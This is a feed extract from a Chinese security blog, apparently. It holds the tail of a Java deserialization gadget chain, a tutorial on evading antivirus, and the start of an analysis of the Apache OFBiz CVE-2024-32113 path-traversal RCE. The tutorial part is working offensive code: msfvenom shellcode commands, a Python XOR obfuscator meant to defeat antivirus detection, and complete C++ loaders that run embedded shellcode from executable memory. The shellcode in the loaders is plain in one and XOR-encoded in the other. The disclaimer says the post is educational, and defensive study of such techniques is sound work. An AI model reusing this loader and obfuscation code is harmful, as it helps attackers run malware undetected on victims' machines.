nodeC;<br>     <span class="hljs-keyword">try</span> &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>         nodeC = Class.forName(<span class="hljs-string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);<br>     &#125;<br>     Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>     nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>     Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o, <span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-literal">null</span>));<br>     Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, o2, <span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-literal">null</span>));<br>     utils.setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>     <span class="hljs-keyword">return</span> s;<br> &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>gadget</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态恶意代码逃逸学习(1)</title>
    <link href="/2024/06/03/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/"/>
    <url>/2024/06/03/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​2024，代码审计+渗透测试已经满足不了市场，所以准备花几个月学免杀，虽然以前写一个一些免杀，但是好久没用上。so，这次就从头开始。</p><h2 id="0x02-Shellcode定义"><a href="#0x02-Shellcode定义" class="headerlink" title="0x02 Shellcode定义"></a>0x02 Shellcode定义</h2><p>​Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p><h2 id="0x03-RAW文件"><a href="#0x03-RAW文件" class="headerlink" title="0x03 RAW文件"></a>0x03 RAW文件</h2><p>​RAW 中文意思是原始的、未经加工的，RAW文件是可以直接进行字节操作读取的，我本地直接使用msf生成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/exec CMD=calc.exe -f raw &gt;calc.bin &amp;&amp; cat calc.bin<br></code></pre></td></tr></table></figure><p><img src="image-20240603100824843.png" alt="image-20240603100824843"></p><h2 id="0x04-C文件"><a href="#0x04-C文件" class="headerlink" title="0x04 C文件"></a>0x04 C文件</h2><p>​C文件给出的是一个C语言中的字符数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">msfvenom -p windows/exec CMD=calc.exe -f c<br></code></pre></td></tr></table></figure><p><img src="image-20240603101855811.png" alt="image-20240603101855811"></p><h2 id="0x05-混淆"><a href="#0x05-混淆" class="headerlink" title="0x05 混淆"></a>0x05 混淆</h2><p>​由于反病毒软件对于默认生成的文件查杀较为严格，这里写个简单的混淆脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> argparse <span class="hljs-keyword">import</span> ArgumentParser, FileType<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_xor</span>(<span class="hljs-params">bytearray_data, xor_key, output_file=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bytearray_data)):<br>        bytearray_data[i] ^= xor_key<br>    <span class="hljs-keyword">if</span>  output_file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(bytearray_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-built_in">type</span>=FileType(<span class="hljs-string">&quot;rb&quot;</span>), <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输入文件路径&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;mode&quot;</span>, choices=[<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;cs&quot;</span>], <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出模式：c 或 cs&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-x&quot;</span>, <span class="hljs-string">&quot;--xor&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;XOR 密钥&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输出xor的bin文件&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.xor:<br>        xor_key = args.xor<br>    <span class="hljs-keyword">else</span>:<br>        xor_key = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> args.mode == <span class="hljs-string">&quot;c&quot;</span>:<br>        <span class="hljs-comment"># 适用于 C shellcode</span><br>        shellcode = <span class="hljs-string">&quot;\&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode += <span class="hljs-string">&quot;\\x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>)<br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode += <span class="hljs-string">&quot;\&quot; \n\&quot;&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        shellcode += <span class="hljs-string">&quot;\&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsigned char buf[] =\n&quot;</span> + shellcode + <span class="hljs-string">&quot;;&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 适用于 C# shellcode</span><br>        shellcode_raw = <span class="hljs-string">&quot;&quot;</span><br>        shellcode_hex = <span class="hljs-string">&quot;&quot;</span><br>        ctr = <span class="hljs-number">1</span><br>        maxlen = <span class="hljs-number">15</span><br><br>        bytearray_data = <span class="hljs-built_in">bytearray</span>(args.file.read())<br><br>        <span class="hljs-keyword">if</span> xor_key:<br>            apply_xor(bytearray_data, xor_key, args.output)<br><br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bytearray_data:<br>            shellcode_hex += <span class="hljs-string">&quot;0x&quot;</span> + <span class="hljs-built_in">format</span>(b, <span class="hljs-string">&#x27;02x&#x27;</span>) + <span class="hljs-string">&quot;,&quot;</span><br>            <span class="hljs-keyword">if</span> ctr == maxlen:<br>                shellcode_hex += <span class="hljs-string">&quot;\n&quot;</span><br>                ctr = <span class="hljs-number">0</span><br>            ctr += <span class="hljs-number">1</span><br>        length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bytearray_data))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;byte[] buf = new byte[&quot;</span> + length + <span class="hljs-string">&quot;] &#123;\n&quot;</span> + shellcode_hex[:-<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;&#125;;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="image-20240603141754747.png" alt="image-20240603141754747"></p><p>实现把bin转为可用的shellcode格式，-x是进行混淆，不带x就默认转格式，-o是bin进行xor在生成新的bin。</p><h2 id="0x05-关于Windows操作系统内存"><a href="#0x05-关于Windows操作系统内存" class="headerlink" title="0x05 关于Windows操作系统内存"></a>0x05 关于Windows操作系统内存</h2><p>​Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。</p><p>操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。</p><p>​在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。</p><p>申请方式：</p><ul><li><p>HeapAlloc</p></li><li><p>malloc</p></li><li><p>VirtualAlloc</p></li><li><p>new</p></li><li><p>LocalAlloc</p></li><li><p>…</p><p>其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。</p></li></ul><h2 id="0x06-加载"><a href="#0x06-加载" class="headerlink" title="0x06 加载"></a>0x06 加载</h2><ul><li>不做处理</li></ul><p>直接使用msf生成的c代码，可以正常加载</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, TCHAR* argv[])</span> </span>&#123;<br><br>    <span class="hljs-type">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br>        <span class="hljs-string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span><br>        <span class="hljs-string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span><br>        <span class="hljs-string">&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span><br>        <span class="hljs-string">&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span><br>        <span class="hljs-string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span><br>        <span class="hljs-string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;</span><br>        <span class="hljs-string">&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;</span><br>        <span class="hljs-string">&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;</span><br>        <span class="hljs-string">&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;</span><br>        <span class="hljs-string">&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;</span><br>        <span class="hljs-string">&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span><br>        <span class="hljs-string">&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br>        <span class="hljs-string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;</span><br>        <span class="hljs-string">&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span><br>        <span class="hljs-string">&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span><br>        <span class="hljs-string">&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;</span><br>        <span class="hljs-string">&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;</span><br>        <span class="hljs-string">&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;</span><br>        <span class="hljs-string">&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;</span><br>        <span class="hljs-string">&quot;\xd5\x63\x61\x6c\x63\x00&quot;</span>;<br>    <span class="hljs-comment">// 获取shellcode大小</span><br>    shellcode_size = <span class="hljs-built_in">sizeof</span>(buf);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    VirtualAlloc(</span><br><span class="hljs-comment">        NULL, // 基址</span><br><span class="hljs-comment">        800,  // 大小</span><br><span class="hljs-comment">        MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>    <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_size);<br><br>    hThread = <span class="hljs-built_in">CreateThread</span>(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>        (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>        &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240603193122307.png" alt="image-20240603193122307"></p><ul><li>进行一次xor 10</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">load</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-type">int</span> shellcode_size = <span class="hljs-number">0</span>; <span class="hljs-comment">// shellcode长度</span><br>    DWORD dwThreadId; <span class="hljs-comment">// 线程ID</span><br>    HANDLE hThread; <span class="hljs-comment">// 线程句柄</span><br><br>    <span class="hljs-comment">//calc.bin xor 10</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] =<br>        <span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br>        <span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br>        <span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br>        <span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br>        <span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br>        <span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br>        <span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br>        <span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br>        <span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br>        <span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br>        <span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br>        <span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br>        <span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br><br>    <span class="hljs-comment">// 获取shellcode大小</span><br>    shellcode_size = <span class="hljs-built_in">sizeof</span>(buf);<br><br>    <span class="hljs-comment">/* 增加异或代码 */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; shellcode_size; i++) &#123;<br>        buf[i] ^= <span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    VirtualAlloc(</span><br><span class="hljs-comment">        NULL, // 基址</span><br><span class="hljs-comment">        800,  // 大小</span><br><span class="hljs-comment">        MEM_COMMIT, // 内存页状态</span><br><span class="hljs-comment">        PAGE_EXECUTE_READWRITE // 可读可写可执行</span><br><span class="hljs-comment">        );</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">char</span>* shellcode = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<br>        <span class="hljs-literal">NULL</span>,<br>        shellcode_size,<br>        MEM_COMMIT,<br>        PAGE_EXECUTE_READWRITE<br>    );<br>    <span class="hljs-comment">// 将shellcode复制到可执行的内存页中</span><br>    <span class="hljs-built_in">CopyMemory</span>(shellcode, buf, shellcode_size);<br><br>    hThread = <span class="hljs-built_in">CreateThread</span>(<br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 安全描述符</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 栈的大小</span><br>        (LPTHREAD_START_ROUTINE)shellcode, <span class="hljs-comment">// 函数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 参数</span><br>        <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// 线程标志</span><br>        &amp;dwThreadId <span class="hljs-comment">// 线程ID</span><br>    );<br><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE); <span class="hljs-comment">// 一直等待线程执行结束</span><br>&#125;<br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input a string and XOR&#x27;s number!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> xor_key = <span class="hljs-built_in">atoi</span>(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">load</span>(xor_key);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="image-20240603202020801.png" alt="image-20240603202020801"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://rvn0xsy.github.io/archivers/2019-11-10/2/">https://rvn0xsy.github.io/archivers/2019-11-10/2/</a></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录遍历致代码执行漏洞（CVE-2024-32113）分析’</title>
    <link href="/2024/05/28/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-32113%EF%BC%89%E5%88%86%E6%9E%90%E2%80%99/"/>
    <url>/2024/05/28/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2024-32113%EF%BC%89%E5%88%86%E6%9E%90%E2%80%99/</url>
    
    <content type="html"><![CDATA[<h2 id="目录遍历致代码执行漏洞（CVE-2024-32113）分析"><a href="#目录遍历致代码执行漏洞（CVE-2024-32113）分析" class="headerlink" title="目录遍历致代码执行漏洞（CVE-2024-32113）分析"></a>目录遍历致代码执行漏洞（CVE-2024-32113）分析</h2><p>先知首发 <a href="https://xz.aliyun.com/t/14733">https://xz.aliyun.com/t/14733</a></p><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。2024年5月，官方发布新版本修复了CVE-2024-32113 Apache OFBiz 目录遍历致代码执行漏洞，攻击者可构造恶意请求控制服务器。建议尽快修复漏洞。</p><h3 id="0X02-Groovy执行分析"><a href="#0X02-Groovy执行分析" class="headerlink" title="0X02  Groovy执行分析"></a>0X02  Groovy执行分析</h3><p>&#x2F;framework&#x2F;webtools&#x2F;webapp&#x2F;webtools&#x2F;WEB-INF&#x2F;controller.xml </p><p>412-416行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">request-map</span> <span class="hljs-attr">uri</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">security</span> <span class="hljs-attr">https</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">auth</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">response</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;error&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;view&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">request-map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到是view类型</p><p>652行写着对应配置位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">view-map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ProgramExport&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;screen&quot;</span> <span class="hljs-attr">page</span>=<span class="hljs-string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span><br><br></code></pre></td></tr></table></figure><p>apache-ofbiz-18.12.11&#x2F;framework&#x2F;webtools&#x2F;widget&#x2F;EntityScreens.xml</p><p>74-96行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span 